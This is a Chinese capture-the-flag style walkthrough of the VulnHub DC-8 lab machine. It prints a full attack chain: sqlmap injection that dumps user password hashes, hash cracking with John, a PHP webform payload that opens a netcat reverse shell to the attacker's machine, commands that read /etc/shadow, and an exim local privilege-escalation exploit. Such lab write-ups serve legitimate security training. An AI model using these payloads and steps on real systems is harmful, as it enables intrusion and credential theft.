**靶机下载**

网站:<https://www.vulnhub.com/>

不得不说，本地下载真的慢，种子链接下载好香

在下载页面中找到第三个下载种子链接

打开百度网盘，找到离线下载，点击旁边的小箭头，选择添加BT任务，找到刚下载的种子文件，拖进去

此处会显示开始寻找资源然后自动下载，点击刷新可看到最新的下载情况（好像不会自动刷新，一直显示资源寻找中不要慌，手动刷新下）

 **靶机** **\---DC-8**

环境配置：

使用平台：VMware

网卡模式：NAT模式

所属网段：217

攻击机kali：192.168.217.131

靶机dc8：未知

## 一、信息获取

> 1.masscan -p22 192.168.217.0/24 --rate=2000 ---------扫描获取217网段下的linux系统的ip

获取到ip：192.168.217.148，目前只开启了kali和dc8，所以推测该ip为dc8的IP地址

![1626222444_60ee2f6c1b283511df486.png!small](https://image.3001.net/images/20210714/1626222444_60ee2f6c1b283511df486.png!small)

> 2.nmap -sC -sV -p- -n 192.168.217.148 --min-rate=2000 -------扫描获取靶机端口信息

![1626222461_60ee2f7d282e5acdc0c4b.png!small](https://image.3001.net/images/20210714/1626222461_60ee2f7d282e5acdc0c4b.png!small)

得到了： 22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)

80/tcp open http Apache httpd

3.searchsploit OpenSSH 7.4p1 ----------扫描ssh服务的系统漏洞

![1626222476_60ee2f8ca51c03c5f83cd.png!small](https://image.3001.net/images/20210714/1626222476_60ee2f8ca51c03c5f83cd.png!small)

都是用户名枚举，没啥可用的

searchsploit Apache httpd ----------扫描http服务的系统漏洞

![1626222487_60ee2f97ac4034fe42492.png!small](https://image.3001.net/images/20210714/1626222487_60ee2f97ac4034fe42492.png!small)

都没啥有用的

4..gobuster dir -u 192.168.217.148 -w /usr/share/seclists/Discovery/Web-Content/big.txt -t 20------探测目录

![1626222506_60ee2faaed5fb1b3f38e4.png!small](https://image.3001.net/images/20210714/1626222506_60ee2faaed5fb1b3f38e4.png!small)

探测出很多目录，403无法访问，301资源被永久转移无法访问，只有200可用

5.gobuster dir -u 192.168.217.148 -w /usr/share/seclists/Discovery/Web-Content/big.txt -t 20 -s200 -----筛选出了状态200（可访问）的目录

![1626222517_60ee2fb5bdc806d68b686.png!small](https://image.3001.net/images/20210714/1626222517_60ee2fb5bdc806d68b686.png!small)

> /0 (Status: 200)
>
> /node (Status: 200)
>
> /robots.txt (Status: 200)
>
> /user (Status: 200)

6.访问192.168.217.148查看网站首页

![1626222537_60ee2fc96562437593b47.png!small](https://image.3001.net/images/20210714/1626222537_60ee2fc96562437593b47.png!small)

7.访问其余目录

192.168.217.148/0

![1626222554_60ee2fda5ce5ec03433b5.png!small](https://image.3001.net/images/20210714/1626222554_60ee2fda5ce5ec03433b5.png!small)

与首页没什么区别

> 192.168.217.148/node

![1626222565_60ee2fe526acb6e00dc80.png!small](https://image.3001.net/images/20210714/1626222565_60ee2fe526acb6e00dc80.png!small)

内容翻译：尚未创建首页内容

> 192.168.217.148/user

![1626222580_60ee2ff4aeec9d7c39343.png!small](https://image.3001.net/images/20210714/1626222580_60ee2ff4aeec9d7c39343.png!small)

这是个登陆注册界面，很重要

> 192.168.217.148/robots.txt

![1626222590_60ee2ffeb984839e96773.png!small](https://image.3001.net/images/20210714/1626222590_60ee2ffeb984839e96773.png!small)

都是文本

## 二、漏洞挖掘

1.先从首页看起，查看源代码，正经的html编写没啥有用的

2.点点旁边的跳转链接，有了新发现

![1626222599_60ee3007a0b39f4c77e0b.png!small](https://image.3001.net/images/20210714/1626222599_60ee3007a0b39f4c77e0b.png!small)

  

在导航栏处发现了疑似sql语句的东西，可以试试是否存在sql注入，虽然个人很喜欢直接分析源码，但都看出来了就先试试

![1626222622_60ee301e0c9fe20805150.png!small](https://image.3001.net/images/20210714/1626222622_60ee301e0c9fe20805150.png!small)

输入了'，发现网站报错，sql注入实锤，，最后一行还给出了一条路径，不知道有没有用，先准备尝试爆库

![1626222632_60ee30280e4f0513ede73.png!small](https://image.3001.net/images/20210714/1626222632_60ee30280e4f0513ede73.png!small)

> 路径：/var/www/html/sites/all/modules/mypages/mypages.module

3.直接在导航栏上输入语句试试

![1626222641_60ee303124c20ac0b08c7.png!small](https://image.3001.net/images/20210714/1626222641_60ee303124c20ac0b08c7.png!small)

还是报错界面，什么都没有，那抓包看看

4.打开代理，打开burp
suite抓包，再打开一次这个界面![1626222650_60ee303a37d8bbb008e04.png!small](https://image.3001.net/images/20210714/1626222650_60ee303a37d8bbb008e04.png!small)

发现字符被转义，为了加速实现效果，放弃手工注入，采取sqlmap

5.sqlmap -u "<http://192.168.217.148/?nid=1>" --dbs --------获取数据库表名

![1626222725_60ee308553e85380e9d47.png!small](https://image.3001.net/images/20210714/1626222725_60ee308553e85380e9d47.png!small)

获取到两个数据库名，显然，d7db是我们要的数据库

6.sqlmap -u "<http://192.168.217.148/?nid=1>" -D d7db --tables ------获取数据库表名

![1626222755_60ee30a33e3f903ac0466.png!small](https://image.3001.net/images/20210714/1626222755_60ee30a33e3f903ac0466.png!small)

![1626222763_60ee30ab03c04e4b88881.png!small](https://image.3001.net/images/20210714/1626222763_60ee30ab03c04e4b88881.png!small)

一共探测出来了88个表，有一张users表，应该包含了登陆信息，继续探测

7.sqlmap -u "<http://192.168.217.148/?nid=1>" -D d7db -T users --columns------探测表里的列

![1626222772_60ee30b49eb9a81a4e1a8.png!small](https://image.3001.net/images/20210714/1626222772_60ee30b49eb9a81a4e1a8.png!small)

探测出来了16列，name和pass应该是登录的账号和密码

8.sqlmap -u "<http://192.168.217.148/?nid=1>" -D d7db -T users -C name,pass
--dump ------获取数据

![1626222783_60ee30bfde0eba385310c.png!small](https://image.3001.net/images/20210714/1626222783_60ee30bfde0eba385310c.png!small)

获取到了两行数据

> admin $S$D2tRcYRyqVFNSc0NvYUrYeQbLQg5koMKtihYTIDC9QQqJi3ICg5z
>
> john $S$DqupvJbxVmqjr6cYePnx2A891ln7lsuku/3if/oRVZJaz5mKC2vF

后面是一串加密数据

9.用burp suite解码看看，所有模式都试过了，全都不行，直接上百度

查到是要用john工具破解，用户名的john也是一种提示

Vi john---创建一个名为john的文件

把密码写入文档

![1626222796_60ee30cca1d4d1a0d6209.png!small](https://image.3001.net/images/20210714/1626222796_60ee30cca1d4d1a0d6209.png!small)

John john --show ------开始对密码解码

![1626222806_60ee30d68c8ad17d05f39.png!small](https://image.3001.net/images/20210714/1626222806_60ee30d68c8ad17d05f39.png!small)

只获得了一个数据turtle

打开之前探测到的登录界面尝试

> admin turtle
>
> john turtle

![1626222818_60ee30e2dac0fd27788ca.png!small](https://image.3001.net/images/20210714/1626222818_60ee30e2dac0fd27788ca.png!small)

john turtle 进入成功，证明了admin密码破解失败

3.进入靶机

看到了ADD content 看到文本框，先输入点什么抓包看看

![1626222829_60ee30ed3f19f58868ab4.png!small](https://image.3001.net/images/20210714/1626222829_60ee30ed3f19f58868ab4.png!small)

输入的内容都被转码了，无法直接编写shall脚本

再点点别的，在Contact Us 里找到了可以容纳php的地方

Contact Us--Webform--Form settings

![1626222840_60ee30f833e8bcc553490.png!small](https://image.3001.net/images/20210714/1626222840_60ee30f833e8bcc553490.png!small)

> 此处输入shell<?php system("nc -e /bin/sh 192.168.217.131 8888"); ?>保存
>
> 在kali上开启监听nc -lvvp 8888
>
> 在view中随便输入点内容，kali成功获得shell

![1626222850_60ee31027475013e2872a.png!small](https://image.3001.net/images/20210714/1626222850_60ee31027475013e2872a.png!small)

> whoami #查看当前用户身份
>
> uname -a #查看系统信息
>
> history #查看命令历史，有可能可以查看到管理员的一些重要命令，包括密码等
>
> last #查看登录历史
>
> cat /etc/passwd #查看用户
>
> cat /etc/shadow #查看密码

4.提权

> 先返回一个稳定的shell
>
> python -c "import pty;pty.spawn('/bin/bash')"
>
> uname -a #查看内核信息

**![1626222864_60ee3110d208958205998.png!small](https://image.3001.net/images/20210714/1626222864_60ee3110d208958205998.png!small)**

> searchsploit Linux dc-8 4.9.0-4-amd64 -----扫描内核漏洞

![1626222873_60ee3119d19d1e49aad06.png!small](https://image.3001.net/images/20210714/1626222873_60ee3119d19d1e49aad06.png!small)

> 想先从内核漏洞提权出来，但是扫描不到结果
>
> 利用suid提权试试
>
> find / -perm -u=s -type f 2>/dev/null ----查看具有root用户权限的文件

![1626222884_60ee3124e779a78fbbf84.png!small](https://image.3001.net/images/20210714/1626222884_60ee3124e779a78fbbf84.png!small)

> 不知道哪个有用了，查看百度得知，exim4是个特殊文档那就扫描他的漏洞
>
> 根据经验exim4应该是exim的第四代，所以搜索exim的漏洞即可
>
> searchsploit exim

![1626222892_60ee312c6c6e50c65b7fb.png!small](https://image.3001.net/images/20210714/1626222892_60ee312c6c6e50c65b7fb.png!small)

> 搜出来好多，根据翻译结果，Local Privilege Escalation译为本地权限提升，是我们需要的
>
> 选择.sh文件的46996.sh
>
> locate 46996.sh------定位文件

![1626222903_60ee313733954404508be.png!small](https://image.3001.net/images/20210714/1626222903_60ee313733954404508be.png!small)

> 文件位置：/usr/share/exploitdb/exploits/linux/local/46996.sh
>
> 靶机中：scp
> root@192.168.217.131:/usr/share/exploitdb/exploits/linux/local/46996.sh
> /tmp/q.sh ----获取文件

![1626222911_60ee313f2d75a8994f0a4.png!small](https://image.3001.net/images/20210714/1626222911_60ee313f2d75a8994f0a4.png!small)

> chmod 777 q.sh ----给予权限
>
> bash ./q.sh -m netcat-----提权
>
> 失败，字符有问题，百度一下，源文件是doc格式，linux只识别unix，要在kali中修改文件格式再上传
>
> cd /usr/share/exploitdb/exploits/linux/local/
>
> vi 46996.sh
>
> :set ff? # 查询文件格式
>
> :set ff=unix # 将文件格式改成Unix格式

![1626222922_60ee314a1459d64b05e91.png!small](https://image.3001.net/images/20210714/1626222922_60ee314a1459d64b05e91.png!small)

再重做获取文件，权限基于和提权

![1626222931_60ee31533654eed92b273.png!small](https://image.3001.net/images/20210714/1626222931_60ee31533654eed92b273.png!small)

> 提权成功
>
> Cd /root
>
> Ls
>
> Cat flag.txt

![1626222941_60ee315da94e159492612.png!small](https://image.3001.net/images/20210714/1626222941_60ee315da94e159492612.png!small)

成功！

